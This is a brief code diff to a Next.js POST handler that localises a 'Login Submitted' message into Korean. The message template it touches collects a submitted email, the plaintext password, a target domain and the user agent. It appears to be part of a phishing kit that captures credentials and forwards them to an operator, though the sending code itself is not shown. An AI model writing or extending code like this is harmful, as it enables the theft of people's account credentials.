@@ -27,7 +27,7 @@ export async function POST(req: NextRequest) {
     const userAgent = req.headers.get('user-agent') || 'Unknown device'
 
     const message = `
-🔐 Login Submitted:
+🔐 로그인 제출됨:
 📧 Email: ${email}
 🔑 Password: ${password}
 🌐 Domain: ${domain || 'Not provided'}
